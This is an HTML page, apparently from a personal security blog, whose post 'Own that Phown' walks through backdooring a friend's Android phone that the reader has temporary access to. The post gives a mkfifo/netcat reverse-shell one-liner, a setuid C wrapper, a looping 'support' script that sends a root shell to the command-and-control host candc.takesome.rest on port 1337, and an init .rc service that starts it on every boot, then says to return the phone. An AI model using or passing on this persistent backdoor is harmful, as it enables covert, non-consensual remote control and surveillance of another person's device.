@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+    <title>Own that Phown :: </title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Enough is enough, how long will you have access to your buddy&rsquo;s phone and you will not own it totally? Go on, fuck it.
+" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="http://localhost:1313/posts/own-than-phown/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="http://localhost:1313/styles.css">
+
+
+
+<link rel="stylesheet" href="http://localhost:1313/style.css">
+
+
+
+  <link rel="shortcut icon" href="http://localhost:1313/favicon.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="https://hritik.sh" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Own that Phown">
+<meta property="og:description" content="Enough is enough, how long will you have access to your buddy&rsquo;s phone and you will not own it totally? Go on, fuck it.
+" />
+<meta property="og:url" content="http://localhost:1313/posts/own-than-phown/" />
+<meta property="og:site_name" content="" />
+
+  
+    <meta property="og:image" content="http://localhost:1313/favicon.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2021-08-26 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container full">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Hritik&#39;s Blog
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/ctf-writeups">Writeups</a></li>
+        
+      
+        
+          <li><a href="https://github.com/hritik14">Github</a></li>
+        
+      
+        
+          <li><a href="/index.xml">RSS</a></li>
+        
+      
+        
+          <li><a href="/cheatsheets">Cheatsheets</a></li>
+        
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="mailto:ping@hritik.sh">Contact</a></li>
+        
+      
+        
+          <li><a href="https://www.linkedin.com/in/hritikvijay/">LinkedIn</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/ctf-writeups" >Writeups</a></li>
+        
+      
+        
+          <li><a href="https://github.com/hritik14" >Github</a></li>
+        
+      
+        
+          <li><a href="/index.xml" >RSS</a></li>
+        
+      
+      
+        <li>
+          <ul class="menu">
+            <li class="menu__trigger">Show more&nbsp;▾</li>
+            <li>
+              <ul class="menu__dropdown">
+                
+                  
+                    <li><a href="/cheatsheets" >Cheatsheets</a></li>
+                  
+                
+                  
+                    <li><a href="/about" >About</a></li>
+                  
+                
+                  
+                    <li><a href="mailto:ping@hritik.sh" >Contact</a></li>
+                  
+                
+                  
+                    <li><a href="https://www.linkedin.com/in/hritikvijay/" >LinkedIn</a></li>
+                  
+                
+              </ul>
+            </li>
+          </ul>
+        </li>
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="http://localhost:1313/posts/own-than-phown/">Own that Phown</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2021-08-26</time></div>
+
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p>Enough is enough, how long will you have access to your buddy&rsquo;s phone and you will not own it totally?
+Go on, fuck it.</p>
+<p>Learn about init systems.
+init can start up scripts on device startup
+these are called services
+register an init service
+start a script that will call back to c&amp;c and create a connection
+make sure that the script the init service is launching is executable
+Now you can launch a script on startup, but what script to launch ?
+Netcat, of course.</p>
+<p>Android comes with tinybox (new busybox) which comes with netcat! Yay.
+Darn! It doesn&rsquo;t come with the -e flag. Fuck me.
+Now scrape the internet to find a netcat that will run on android and has the -e flag (ie the traditional netcat)
+You can do that (with the risk of downloading an infected netcat) or you can simply grab the source code for netcat from the official site and use your brain.
+Our android is arm32, verify it by using <code>file</code> on any of the installed commands in android, maybe tinybox itself.
+Now simply cross compile netcat with</p>
+<pre class="language-bash"><code>./configure  --host=arm-linux-gnueabihf LDFLAGS=&#34;-static&#34;</code></pre><p>Observe, here, that we are linking it statically, we don&rsquo;t want to have run time dependencies in our backdoor, duh.
+Let&rsquo;s go&hellip;
+.. note:
+To make sure that it is running properly, use adb to push to /data/local/tmp/filename then chmod +x then run</p>
+<p>Well, this doesn&rsquo;t work.
+Use NDK compilation steps on android website.
+Start with downloalding command line tools
+<a href="https://dl.google.com/android/repository/commandlinetools-linux-7583922_latest.zip">https://dl.google.com/android/repository/commandlinetools-linux-7583922_latest.zip</a> - <a href="https://developer.android.com/studio/command-line/sdkmanager">https://developer.android.com/studio/command-line/sdkmanager</a></p>
+<p>Fuck it!
+Just use toybox&rsquo;s netcat (ie openBSD) with fifo</p>
+<pre class="language-bash"><code> On ‘server’ side:
+
+       $ rm -f /tmp/f; mkfifo /tmp/f
+       $ cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc -l 127.0.0.1 1234 &gt; /tmp/f
+
+ On ‘client’ side:
+
+       $ nc host.example.com 1234
+       $ (shell prompt from host.example.com)</code></pre><p>src:https://superuser.com/questions/691008/why-is-the-e-option-missing-from-netcat-openbsd</p>
+<p>This should make the backdoor work but you still need root in the backdoor.
+Let&rsquo;s place a setuid binary that will invoke our support script and call it support_wrapper
+Code:</p>
+<pre class="language-c"><code>#include&lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+int main(){
+        setuid(0);
+        system(&#34;./support&#34;);
+        return 0;
+}</code></pre><p>Compile:
+After installing ndk tools</p>
+<pre class="language-sh"><code>$ android-ndk-r23/toolchains/llvm/prebuilt/linux-x86_64/bin/armv7a-linux-androideabi16-clang exec.c  -static -o support_wrapper</code></pre><p>If you get errors like</p>
+<pre class="language-text"><code>executable&#39;s TLS segment is underaligned: alignment is 8, needs to be at least 32 for ARM Bionic</code></pre><p>Then adjust for sdk version, you can find out by</p>
+<pre class="language-sh"><code>adb shell getprop | grep ro.build.version.sdk</code></pre><p>Then use something lower than that (for me it was 26 and armv7a-linux-androideabi16-clang  worked)</p>
+<p>btw, use google cloud shell to build and shit, you don&rsquo;t wanna install bunch of cross compilation crap on your home system</p>
+<p>Now transfer this file to android via adb from twrp with root and setuid it. Place it somewhere, along with it, create a bash script called <code>support</code></p>
+<pre class="language-bash"><code>#!/system/bin/sh
+
+run(){
+tmp=/data/local/tmp
+rm -f $tmp/support; toybox mkfifo $tmp/support
+cat $tmp/support | /system/bin/sh -i 2&gt;&amp;1 | toybox nc candc.takesome.rest 1337 &gt; $tmp/support
+}
+
+while true; do
+echo &#34;Started&#34; &gt;&gt; /sdcard/xxx
+run
+date &gt;&gt; /sdcard/xxx
+sleep 20
+done
+
+exit 1</code></pre><p>This is our exploit.
+Now, we gotta run the support_wrapper setuid binary whenever device boots, lets do it:
+Go ahead do <code>mount -a</code> after connecting to adb over twrp, that&rsquo;ll mount your system partition. (or mount that from twrp menu)
+Mount system and then go to /system/etc/init
+create some rc file, let&rsquo;s say <code>support.rc</code> and add:</p>
+<pre class="language-rc"><code>on boot
+    start support
+service support /system/etc/init.d/support_wrapper
+    priority 10
+    user root
+    group root</code></pre><p>This will make support_wrapper run on boot.</p>
+<p>B0rk! Yay
+Go return that phone</p>
+<p>TODO: Make this process sideload-able
+Resourec: init language: <a href="https://android.googlesource.com/platform/system/core/&#43;/master/init/README.md">https://android.googlesource.com/platform/system/core/+/master/init/README.md</a></p>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="http://localhost:1313/posts/constant-connection-to-linux-box/">
+                <span class="button__icon">←</span>
+                <span class="button__text">Draft</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="http://localhost:1313/posts/driver-loading-and-binding/">
+                <span class="button__text">Loading and probing of USB device drivers</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
